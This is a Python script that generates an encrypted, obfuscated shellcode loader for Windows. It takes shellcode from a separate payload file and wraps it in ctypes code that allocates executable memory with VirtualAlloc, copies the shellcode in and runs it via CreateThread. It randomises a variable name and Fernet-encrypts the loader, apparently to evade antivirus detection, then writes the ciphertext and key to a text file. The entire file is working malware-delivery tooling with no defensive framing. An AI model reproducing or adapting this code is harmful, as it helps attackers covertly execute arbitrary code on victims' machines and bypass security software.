import ctypes
from cryptography.fernet import Fernet
import random
key = Fernet.generate_key()
f = Fernet(key)

ran_num = random.randint(1,10)
ranStr = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], ran_num))
split = ranStr+'=moon'
pay = open('payload.py', 'r').read()
shellcode = "b'"+pay.split('"')[1]+"'"
x = '''
import ctypes

'''+ranStr+'''=bytearray('''+shellcode+''')
'''+split+'''
kernel32 = ctypes.WinDLL('kernel32')
kernel32.GetModuleHandleW.restype = ctypes.c_void_p
module_handle = kernel32.GetModuleHandleW(None)
kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
kernel32.CreateThread.restype = ctypes.c_void_p
kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
buffer = (ctypes.c_char * len('''+ranStr+''')).from_buffer('''+ranStr+''')
mem = kernel32.VirtualAlloc(None, len('''+ranStr+'''), 0x1000 | 0x2000, 0x40)
if not mem:
    raise Exception("VirtualAlloc error")
ctypes.memmove(mem, buffer, len('''+ranStr+'''))
thread_handle = kernel32.CreateThread(None, 0, mem, None, 0, ctypes.byref(ctypes.c_ulong()))
kernel32.WaitForSingleObject(thread_handle, -1)
'''

enc_pay = f.encrypt(bytes(x.encode()))
file = open('keyword.txt', 'w',encoding="utf-8")
file.writelines('enc_pay:')
file.writelines(enc_pay.decode()+'\n')
file.writelines('key:')
file.writelines(key.decode()+'\n')
file.writelines('split:')
file.writelines(split+'\n')
print(x.split(split)[1])



